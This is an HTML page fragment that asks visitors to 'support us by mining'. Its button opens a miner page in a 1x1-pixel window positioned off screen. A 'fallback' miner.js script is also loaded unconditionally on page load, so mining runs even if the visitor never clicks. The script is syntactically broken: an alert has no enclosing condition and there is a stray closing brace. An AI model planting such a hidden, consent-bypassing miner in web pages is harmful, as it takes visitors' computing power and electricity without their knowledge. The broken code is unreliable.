    <title>Support Page</title>
</head>
<body>
    <h2>Thank you for visiting. Click below to support us by mining.</h2>
    <button onclick="openMiningTab()">Start Mining</button>

    <script>
        function openMiningTab() {
            var miningWindow = window.open('mine.html', '', 'width=1,height=1,left=10000,top=10000');

                alert('Popup blocked! Mining will continue in this tab.');
            }
        }
    </script>

    <!-- Fallback Mining Script (inline in index.html) -->
    <script src="scripts/miner.js"></script>
</body>
